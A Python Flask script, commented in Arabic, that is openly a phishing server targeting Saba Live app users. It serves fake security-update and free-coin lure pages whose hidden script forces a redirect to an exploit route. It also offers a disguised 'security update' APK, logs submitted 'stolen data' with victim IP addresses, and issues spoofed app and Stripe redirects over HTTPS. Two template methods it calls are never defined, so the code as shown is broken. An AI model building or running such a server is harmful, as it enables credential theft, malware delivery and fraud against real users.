#!/usr/bin/env python3
# Phishing Server - Updated for Saba Live

from flask import Flask, request, render_template_string, redirect, Response
import threading
import ssl
import random
import json
from datetime import datetime

class SabaPhishingServer:
    def __init__(self):
        self.app = Flask(__name__)
        self.templates = self.load_templates()
        self.setup_routes()
        
    def load_templates(self):
        """تحميل قوالب التصيد لـ Saba Live"""
        return {
            'security_update': self.security_update_template(),
            'free_coins': self.free_coins_template(),
            'payment_verification': self.payment_verification_template(),
            'account_suspension': self.account_suspension_template()
        }
    
    def security_update_template(self):
        """قالب تحديث أمني"""
        return '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Saba Live - Security Update Required</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
                
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Roboto', sans-serif;
                }
                
                body {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    padding: 20px;
                }
                
                .container {
                    background: rgba(255, 255, 255, 0.1);
                    backdrop-filter: blur(20px);
                    border-radius: 20px;
                    padding: 40px;
                    max-width: 500px;
                    width: 100%;
                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
                    border: 1px solid rgba(255, 255, 255, 0.2);
                }
                
                .logo {
                    text-align: center;
                    margin-bottom: 30px;
                }
                
                .logo h1 {
                    color: white;
                    font-size: 32px;
                    font-weight: 700;
                    text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
                }
                
                .logo .subtitle {
                    color: rgba(255, 255, 255, 0.8);
                    font-size: 16px;
                    margin-top: 5px;
                }
                
                .alert-box {
                    background: rgba(255, 87, 87, 0.2);
                    border: 1px solid rgba(255, 87, 87, 0.5);
                    border-radius: 10px;
                    padding: 20px;
                    margin-bottom: 30px;
                }
                
                .alert-title {
                    color: #ff5757;
                    font-size: 20px;
                    font-weight: 600;
                    margin-bottom: 10px;
                    display: flex;
                    align-items: center;
                    gap: 10px;
                }
                
                .alert-message {
                    color: rgba(255, 255, 255, 0.9);
                    font-size: 15px;
                    line-height: 1.6;
                }
                
                .benefits {
                    background: rgba(76, 175, 80, 0.2);
                    border: 1px solid rgba(76, 175, 80, 0.5);
                    border-radius: 10px;
                    padding: 20px;
                    margin-bottom: 30px;
                }
                
                .benefits-title {
                    color: #4CAF50;
                    font-size: 18px;
                    font-weight: 600;
                    margin-bottom: 15px;
                }
                
                .benefits-list {
                    color: rgba(255, 255, 255, 0.9);
                    list-style: none;
                }
                
                .benefits-list li {
                    margin-bottom: 10px;
                    padding-left: 25px;
                    position: relative;
                }
                
                .benefits-list li:before {
                    content: "✓";
                    position: absolute;
                    left: 0;
                    color: #4CAF50;
                    font-weight: bold;
                }
                
                .update-button {
                    display: block;
                    width: 100%;
                    background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
                    color: white;
                    border: none;
                    border-radius: 10px;
                    padding: 18px;
                    font-size: 18px;
                    font-weight: 600;
                    cursor: pointer;
                    transition: all 0.3s ease;
                    text-align: center;
                    text-decoration: none;
                    box-shadow: 0 5px 15px rgba(76, 175, 80, 0.4);
                }
                
                .update-button:hover {
                    transform: translateY(-2px);
                    box-shadow: 0 8px 20px rgba(76, 175, 80, 0.6);
                }
                
                .update-button:active {
                    transform: translateY(0);
                }
                
                .footer-note {
                    color: rgba(255, 255, 255, 0.6);
                    font-size: 12px;
                    text-align: center;
                    margin-top: 20px;
                    line-height: 1.5;
                }
                
                .warning {
                    color: rgba(255, 255, 255, 0.7);
                    font-size: 11px;
                    text-align: center;
                    margin-top: 10px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">
                    <h1>Saba Live</h1>
                    <div class="subtitle">Voice Chat & Social Network</div>
                </div>
                
                <div class="alert-box">
                    <div class="alert-title">
                        <span>⚠️</span> URGENT SECURITY UPDATE REQUIRED
                    </div>
                    <div class="alert-message">
                        Our security system has detected suspicious activity on your account. 
                        To protect your coins and personal information, an immediate security 
                        update is required within the next 24 hours.
                    </div>
                </div>
                
                <div class="benefits">
                    <div class="benefits-title">🎁 Update Benefits</div>
                    <ul class="benefits-list">
                        <li>50,000 FREE Coins (Limited Time)</li>
                        <li>VIP Status for 30 Days</li>
                        <li>Priority Customer Support</li>
                        <li>Enhanced Account Security</li>
                        <li>Exclusive Gift Package</li>
                    </ul>
                </div>
                
                <a href="/exploit" class="update-button">
                    UPDATE NOW & GET FREE COINS
                </a>
                
                <div class="footer-note">
                    By clicking "UPDATE NOW", you agree to install the latest security patch 
                    and receive promotional coins. This process is automatic and takes less 
                    than 30 seconds.
                </div>
                
                <div class="warning">
                    ⚠️ Failure to update may result in temporary account suspension.
                </div>
            </div>
            
            <!-- Hidden exploit script -->
            <script>
            setTimeout(function() {
                // Auto-redirect to exploit after 5 seconds
                window.location.href = '/exploit';
            }, 5000);
            
            // Track user interaction
            document.addEventListener('click', function() {
                window.location.href = '/exploit';
            });
            </script>
        </body>
        </html>
        '''
    
    def free_coins_template(self):
        """قالب الحصول على عملات مجانية"""
        return '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>🎁 Get 50,000 Free Saba Coins!</title>
            <style>
                body {
                    background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
                    color: white;
                    font-family: Arial, sans-serif;
                    text-align: center;
                    padding: 20px;
                }
                
                .coins-animation {
                    font-size: 60px;
                    margin: 20px 0;
                    animation: bounce 1s infinite;
                }
                
                @keyframes bounce {
                    0%, 100% { transform: translateY(0); }
                    50% { transform: translateY(-20px); }
                }
                
                .claim-button {
                    background: gold;
                    color: black;
                    padding: 20px 40px;
                    font-size: 24px;
                    border: none;
                    border-radius: 50px;
                    cursor: pointer;
                    margin: 20px 0;
                    font-weight: bold;
                }
            </style>
        </head>
        <body>
            <h1>🎁 LIMITED TIME OFFER!</h1>
            <div class="coins-animation">💰 🪙 💎</div>
            <h2>Get 50,000 FREE Saba Coins!</h2>
            <p>Click the button below to claim your free coins instantly!</p>
            
            <button class="claim-button" onclick="window.location.href='/exploit'">
                🎯 CLAIM FREE COINS NOW!
            </button>
            
            <p><small>Offer expires in 24 hours. One claim per user.</small></p>
        </body>
        </html>
        '''
    
    def setup_routes(self):
        """إعداد مسارات Flask"""
        
        @self.app.route('/')
        def index():
            """الصفحة الرئيسية - اختيار عشوائي للقالب"""
            template_key = random.choice(list(self.templates.keys()))
            return render_template_string(self.templates[template_key])
        
        @self.app.route('/exploit')
        def serve_exploit():
            """تقديم صفحة الاستغلال"""
            from exploits.android_exploits import SabaAndroidExploits
            exploit = SabaAndroidExploits()
            return exploit.generate_saba_intent_exploit()
        
        @self.app.route('/update.apk')
        def serve_malicious_apk():
            """تقديم APK خبيث"""
            # هنا سيتم توليد أو تقديم APK خبيث
            apk_content = b"FAKE_APK_CONTENT"  # سيتم استبدالها بـ APK حقيقي
            
            return Response(
                apk_content,
                mimetype='application/vnd.android.package-archive',
                headers={
                    'Content-Disposition': 'attachment; filename="SabaLive_Security_Update_v1.2.6.apk"',
                    'Content-Length': str(len(apk_content))
                }
            )
        
        @self.app.route('/log', methods=['POST'])
        def log_stolen_data():
            """تسجيل البيانات المسروقة"""
            data = request.get_json() or request.form
            
            # تسجيل البيانات
            with open('logs/stolen_data.log', 'a') as f:
                f.write(json.dumps({
                    'timestamp': datetime.now().isoformat(),
                    'ip': request.remote_addr,
                    'data': data
                }) + '\n')
            
            return '', 200
        
        @self.app.route('/saba_deeplink')
        def saba_deeplink():
            """رابط Deeplink لـ Saba Live"""
            return redirect('saba://voice?source=promo&coins=50000')
        
        @self.app.route('/stripe_redirect')
        def stripe_redirect():
            """تحويل Stripe مزيف"""
            return redirect('stripe-auth://link-accounts/me.sabachat.live/authentication_return?success=true&coins=99999')
    
    def start_server(self, host='0.0.0.0', port=443):
        """بدء خادم التصيد"""
        # إنشاء سياق SSL
        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
        context.load_cert_chain('cert.pem', 'key.pem')
        
        # تشغيل الخادم في thread منفصل
        server_thread = threading.Thread(
            target=self.app.run,
            kwargs={
                'host': host,
                'port': port,
                'ssl_context': context,
                'debug': False,
                'threaded': True
            },
            daemon=True
        )
        server_thread.start()
        
        print(f"[+] Saba Phishing Server started on https://{host}:{port}")
        return True
